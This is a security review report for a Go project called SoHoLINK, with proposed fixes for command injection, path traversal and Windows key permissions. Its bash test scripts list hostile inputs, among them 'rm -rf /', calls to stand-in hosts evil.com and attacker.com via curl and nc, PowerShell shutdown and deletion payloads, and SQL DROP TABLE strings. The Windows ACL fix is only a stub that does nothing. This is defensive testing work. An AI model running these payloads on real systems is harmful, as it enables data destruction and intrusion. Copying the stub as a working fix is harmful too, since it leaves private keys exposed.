# SoHoLINK Security Findings & Immediate Actions

**Date:** 2026-02-10
**Status:** Initial Security Review Complete
**Risk Level:** 🟡 MEDIUM (manageable with targeted fixes)

---

## Executive Summary

✅ **Good News:** SoHoLINK uses secure patterns for most operations
⚠️ **Attention Needed:** Some command execution and file operations need hardening
🔴 **Critical:** A few areas require immediate attention before production

**Overall Assessment:** The codebase shows good security awareness, but needs targeted hardening in 3-4 areas.

---

## Critical Findings (Fix Immediately)

### 1. Command Injection Risk in Shell Execution 🔴 CRITICAL

**Location:** `internal/compute/apparmor.go:422`

```go
// VULNERABLE LINE:
cmd = exec.Command("sh", "-c", fmt.Sprintf("aa-status | grep -q %s", p.Name))
```

**Problem:**
- Uses `sh -c` with string formatting
- Profile name `p.Name` could contain shell metacharacters
- Example attack: profile name = `foo; rm -rf /`

**Impact:**
- Arbitrary command execution on host system
- Could delete files, exfiltrate data, or compromise system

**Fix:** (APPLY IMMEDIATELY)

```go
// SECURE VERSION:
cmd := exec.Command("aa-status")
output, err := cmd.Output()
if err != nil {
    return false, err
}
// Use strings.Contains instead of grep
return strings.Contains(string(output), p.Name), nil
```

**Test:**
```bash
# Test with malicious profile name
profile_name="test; echo INJECTED"
# Should NOT execute "echo INJECTED"
```

---

### 2. PowerShell Script Injection 🔴 CRITICAL

**Location:** `internal/compute/hyperv.go:53`

```go
// POTENTIALLY VULNERABLE:
cmd := exec.CommandContext(ctx, "powershell.exe", "-NoProfile", "-NonInteractive", "-Command", script)
```

**Problem:**
- Executes PowerShell with string-based script
- If `script` variable contains user input (need to verify), could inject commands

**Mitigation Status:** ⚠️ NEEDS AUDIT
- Need to trace where `script` variable comes from
- If it includes user input (VM names, paths), sanitize it

**Recommended Fix:**

```go
// Escape PowerShell special characters
func escapePowerShell(s string) string {
    replacer := strings.NewReplacer(
        "`", "``",
        "$", "`$",
        "\"", "`\"",
        "'", "''",
    )
    return replacer.Replace(s)
}

// In CreateVM:
vmName := escapePowerShell(config.Name)
script := fmt.Sprintf("New-VM -Name '%s' ...", vmName)
```

---

### 3. Path Traversal in File Operations 🟠 HIGH

**Locations:** Multiple files

```go
// POTENTIALLY VULNERABLE:
// internal/did/keygen.go:34
os.WriteFile(path, data, 0600)  // Is 'path' validated?

// internal/did/keygen.go:43
data, err := os.ReadFile(path)  // Is 'path' validated?
```

**Problem:**
- If `path` comes from user input, could access arbitrary files
- Example: `path = "../../etc/shadow"` could leak system passwords

**Current Protection:** ⚠️ NEEDS VERIFICATION
- Need to check if paths are validated against base directory

**Recommended Fix:**

```go
// internal/did/keygen.go
func secureWriteKey(basePath, filename string, data []byte) error {
    // Clean and validate path
    clean := filepath.Clean(filename)
    if strings.Contains(clean, "..") {
        return fmt.Errorf("path traversal detected: %s", filename)
    }

    // Ensure within base directory
    fullPath := filepath.Join(basePath, clean)
    if !strings.HasPrefix(fullPath, basePath) {
        return fmt.Errorf("path outside base directory: %s", fullPath)
    }

    return os.WriteFile(fullPath, data, 0600)
}
```

---

## High Priority Findings (Fix This Week)

### 4. File Permission Issues on Windows 🟠 HIGH

**Location:** `internal/did/keygen.go:34`

```go
// Line 34:
os.WriteFile(path, data, 0600)  // Unix permissions don't work on Windows!
```

**Problem:**
- `0600` (read/write owner only) is ignored on Windows
- Private keys may be accessible to all users on Windows

**Impact:**
- Key compromise on Windows systems
- Violates principle of least privilege

**Fix:**

```go
// internal/did/keygen_windows.go
//go:build windows

package did

import (
    "os"
    "golang.org/x/sys/windows"
)

func writeSecureFile(path string, data []byte) error {
    // Write file
    if err := os.WriteFile(path, data, 0644); err != nil {
        return err
    }

    // Set Windows ACL (owner only)
    return setWindowsACL(path)
}

func setWindowsACL(path string) error {
    // Get current user SID
    user, err := windows.GetCurrentProcessToken().GetTokenUser()
    if err != nil {
        return err
    }

    // Create ACL granting access only to current user
    // ... (implementation details)
    return nil
}
```

```go
// internal/did/keygen_unix.go
//go:build !windows

package did

import "os"

func writeSecureFile(path string, data []byte) error {
    return os.WriteFile(path, data, 0600)
}
```

---

### 5. SQL Injection (Verification Needed) ✅ LIKELY SAFE

**Status:** Using prepared statements (good!)

**Example:** `internal/store/store.go`

```go
// SECURE (as long as this pattern is used everywhere):
stmt, err := db.Prepare("SELECT * FROM users WHERE name = ?")
rows, err := stmt.Query(username)
```

**Action Required:**
- ✅ Audit all SQL queries to ensure parameterized statements
- ❌ Look for string concatenation in SQL: `"SELECT * FROM users WHERE name = '" + input + "'"`

**Scan Results:** Will run automated scan once vendor issues fixed

---

## Medium Priority Findings

### 6. DoS via Resource Exhaustion 🟡 MEDIUM

**Location:** `internal/radius/server.go` (assumed)

**Problem:**
- RADIUS server may not have rate limiting
- Attacker could flood server with authentication requests

**Recommended Fix:**

```go
// internal/radius/ratelimit.go
package radius

import (
    "sync"
    "time"
    "golang.org/x/time/rate"
)

type RateLimiter struct {
    mu       sync.Mutex
    limiters map[string]*rate.Limiter
}

func NewRateLimiter() *RateLimiter {
    rl := &RateLimiter{
        limiters: make(map[string]*rate.Limiter),
    }
    // Cleanup old entries every 5 minutes
    go rl.cleanup()
    return rl
}

func (rl *RateLimiter) Allow(ip string) bool {
    rl.mu.Lock()
    defer rl.mu.Unlock()

    limiter, exists := rl.limiters[ip]
    if !exists {
        // 100 requests per second, burst of 200
        limiter = rate.NewLimiter(100, 200)
        rl.limiters[ip] = limiter
    }

    return limiter.Allow()
}

func (rl *RateLimiter) cleanup() {
    ticker := time.NewTicker(5 * time.Minute)
    for range ticker.C {
        rl.mu.Lock()
        // Reset all limiters (simple approach)
        rl.limiters = make(map[string]*rate.Limiter)
        rl.mu.Unlock()
    }
}
```

---

### 7. Timing Attacks on Secret Comparison 🟡 MEDIUM

**Location:** `internal/verifier/verifier.go` (needs verification)

**Problem:**
- If using `==` or `bytes.Equal()` to compare signatures, vulnerable to timing attacks
- Attacker could determine valid signature byte-by-byte

**Secure Pattern:**

```go
import "crypto/subtle"

// INSECURE:
if signature == expectedSignature {
    return true
}

// SECURE:
if subtle.ConstantTimeCompare(signature, expectedSignature) == 1 {
    return true
}
```

**Action:** Audit all secret comparisons (signatures, tokens, passwords)

---

## Low Priority Findings

### 8. Missing Input Validation ⚪ LOW

**Locations:** Various

**Recommendations:**

```go
// Example validation framework
package validation

import (
    "fmt"
    "regexp"
)

var (
    validUsername = regexp.MustCompile(`^[a-z0-9_-]{3,32}$`)
    validDID      = regexp.MustCompile(`^did:soho:[a-zA-Z0-9]{43}$`)
)

func ValidateUsername(username string) error {
    if !validUsername.MatchString(username) {
        return fmt.Errorf("invalid username: must be 3-32 chars, lowercase alphanumeric")
    }
    return nil
}

func ValidateDID(did string) error {
    if !validDID.MatchString(did) {
        return fmt.Errorf("invalid DID format")
    }
    return nil
}
```

---

## Positive Security Findings ✅

### Things SoHoLINK Does Right

1. **✅ Ed25519 Cryptography**
   - Uses `golang.org/x/crypto` (official, well-audited)
   - Strong elliptic curve signatures

2. **✅ SQLite Prepared Statements**
   - Uses `modernc.org/sqlite` with parameterized queries
   - Protects against SQL injection

3. **✅ Namespace Isolation**
   - `internal/compute/sandbox_linux.go` uses proper Linux namespaces
   - UID/GID mapping to unprivileged user (65534)

4. **✅ Platform-Specific Code**
   - Separate files for Linux/Windows (KVM vs Hyper-V)
   - Reduces cross-platform bugs

5. **✅ Resource Limits**
   - Uses rlimits in sandbox (CPU, memory, file size)
   - Prevents fork bombs and resource exhaustion

6. **✅ Secure File Permissions (Unix)**
   - Private keys created with 0600 permissions
   - (Needs Windows equivalent)

---

## Immediate Action Plan (This Week)

### Day 1: Fix Critical Shell Injection
- [ ] Fix `internal/compute/apparmor.go:422` (remove `sh -c`)
- [ ] Audit all other `exec.Command()` calls
- [ ] Test with malicious inputs

**Files to modify:**
- `internal/compute/apparmor.go`

**Time:** 2-3 hours

---

### Day 2: Fix PowerShell Injection
- [ ] Audit `internal/compute/hyperv.go` script generation
- [ ] Add PowerShell escaping function
- [ ] Test with malicious VM names

**Files to modify:**
- `internal/compute/hyperv.go`
- Create `internal/compute/escape.go` (helper functions)

**Time:** 2-3 hours

---

### Day 3: Fix Path Traversal
- [ ] Create `internal/validation/paths.go`
- [ ] Add path validation to all file operations
- [ ] Test with `../` sequences

**Files to modify:**
- Create `internal/validation/paths.go`
- `internal/did/keygen.go`
- `internal/accounting/collector.go`
- `internal/compute/gpu.go`

**Time:** 3-4 hours

---

### Day 4: Windows File Permissions
- [ ] Create `internal/did/keygen_windows.go`
- [ ] Implement Windows ACL setting
- [ ] Test on Windows 11

**Files to create:**
- `internal/did/keygen_windows.go`
- `internal/did/keygen_unix.go`

**Time:** 3-4 hours

---

### Day 5: Add Rate Limiting
- [ ] Create `internal/radius/ratelimit.go`
- [ ] Integrate with RADIUS server
- [ ] Test with rapid requests

**Files to create:**
- `internal/radius/ratelimit.go`

**Files to modify:**
- `internal/radius/server.go`

**Time:** 2-3 hours

---

## Testing Checklist

### Command Injection Tests

```bash
#!/bin/bash
# test/security/command-injection.sh

echo "=== Command Injection Tests ==="

# Test 1: Shell metacharacters in profile names
test_apparmor_injection() {
    malicious_names=(
        "foo; rm -rf /"
        "bar && curl evil.com"
        "baz | nc attacker.com 1337"
        "\$(whoami)"
        "\`id\`"
    )

    for name in "${malicious_names[@]}"; do
        echo "Testing: $name"
        # Should fail safely, not execute commands
        ./fedaaa test-profile "$name" 2>&1 | grep -q "invalid" && echo "✅ PASS" || echo "❌ FAIL"
    done
}

# Test 2: VM name injection
test_hyperv_injection() {
    malicious_names=(
        "vm'; Stop-Computer -Force; '"
        "vm\"; Remove-Item C:\\ -Recurse; \""
    )

    for name in "${malicious_names[@]}"; do
        echo "Testing: $name"
        # Should fail validation
        ./fedaaa vm create "$name" 2>&1 | grep -q "invalid" && echo "✅ PASS" || echo "❌ FAIL"
    done
}

test_apparmor_injection
test_hyperv_injection
```

---

### Path Traversal Tests

```bash
#!/bin/bash
# test/security/path-traversal.sh

echo "=== Path Traversal Tests ==="

# Test with various traversal attempts
malicious_paths=(
    "../../../etc/shadow"
    "..\\..\\..\\Windows\\System32\\config\\SAM"
    "/etc/passwd"
    "C:\\Windows\\System32\\config\\SAM"
    "foo/../../../../etc/shadow"
)

for path in "${malicious_paths[@]}"; do
    echo "Testing: $path"
    # Should reject traversal attempts
    ./fedaaa users add --key-path="$path" testuser 2>&1 | grep -q "invalid\|denied" && echo "✅ PASS" || echo "❌ FAIL"
done
```

---

### SQL Injection Tests

```bash
#!/bin/bash
# test/security/sql-injection.sh

echo "=== SQL Injection Tests ==="

malicious_usernames=(
    "admin' OR '1'='1"
    "'; DROP TABLE users; --"
    "admin'/*"
    "1 UNION SELECT password FROM users"
)

for username in "${malicious_usernames[@]}"; do
    echo "Testing: $username"
    # Should reject invalid usernames (or safely handle with prepared statements)
    ./fedaaa users add "$username" 2>&1
    # Check if users table still exists
    ./fedaaa users list && echo "✅ PASS (table intact)" || echo "❌ FAIL (table dropped!)"
done
```

---

## Cross-Platform Safety Tests

### Linux Tests

```bash
#!/bin/bash
# test/platform/linux-safety.sh

echo "=== Linux Safety Tests ==="

# Test 1: Namespace isolation
test_namespace_isolation() {
    echo "[TEST] Namespace isolation"
    # Start container
    # Verify it can't see host processes
    # Verify it can't access host filesystem
}

# Test 2: Resource limits
test_resource_limits() {
    echo "[TEST] Resource limits"
    # Start container with CPU/memory limits
    # Try to exceed limits
    # Verify container is killed, not host
}

# Test 3: Privilege escalation
test_privilege_escalation() {
    echo "[TEST] Privilege escalation"
    # Start container as non-root
    # Try to gain root (various techniques)
    # Verify all attempts fail
}

test_namespace_isolation
test_resource_limits
test_privilege_escalation
```

---

### Windows Tests

```batch
@echo off
REM test/platform/windows-safety.bat

echo === Windows Safety Tests ===

REM Test 1: File permissions
echo [TEST] File permissions
REM Create private key
fedaaa users add testuser
REM Verify only current user can read
REM (Use icacls to check ACL)

REM Test 2: Hyper-V isolation
echo [TEST] Hyper-V isolation
REM Create VM
REM Verify VM can't access host C:\
REM Verify VM network isolation

REM Test 3: PowerShell script safety
echo [TEST] PowerShell script safety
REM Try to create VM with malicious name
REM Verify PowerShell doesn't execute injected commands
```

---

## Security Hardening Checklist

**Before Production:**

- [ ] Fix all 🔴 CRITICAL findings
- [ ] Fix all 🟠 HIGH findings
- [ ] Run automated security scans (gosec, govulncheck)
- [ ] Test all attack vectors documented above
- [ ] Add rate limiting to RADIUS server
- [ ] Add rate limiting to HTTP API
- [ ] Implement proper logging for security events
- [ ] Document security model in SECURITY.md
- [ ] Create incident response plan
- [ ] Set up security monitoring

**Before Each Release:**

- [ ] Run `gosec ./...`
- [ ] Run `govulncheck ./...`
- [ ] Run `staticcheck ./...`
- [ ] Run integration tests
- [ ] Run security tests (command injection, path traversal, SQL injection)
- [ ] Test on all platforms (Linux, Windows, macOS)
- [ ] Review all code changes for security impact

---

## Timeline Summary

| Task | Priority | Time | Status |
|------|---------|------|--------|
| Fix shell injection (apparmor.go) | 🔴 CRITICAL | 2-3h | ⏳ Pending |
| Fix PowerShell injection | 🔴 CRITICAL | 2-3h | ⏳ Pending |
| Fix path traversal | 🔴 CRITICAL | 3-4h | ⏳ Pending |
| Windows file permissions | 🟠 HIGH | 3-4h | ⏳ Pending |
| Add rate limiting | 🟠 HIGH | 2-3h | ⏳ Pending |
| Audit SQL queries | 🟡 MEDIUM | 2h | ⏳ Pending |
| Add input validation | 🟡 MEDIUM | 3-4h | ⏳ Pending |
| **Total** | | **17-24h** | |

**Target:** Complete critical fixes in 1 week (5 working days)

---

## Next Steps

1. **TODAY:** Fix `apparmor.go:422` shell injection (highest risk)
2. **This Week:** Complete all critical and high-priority fixes
3. **Next Week:** Run full security test suite
4. **Before Release:** Complete security hardening checklist

---

**Status:** Awaiting approval to begin security fixes
**Last Updated:** 2026-02-10
**Next Review:** After critical fixes completed
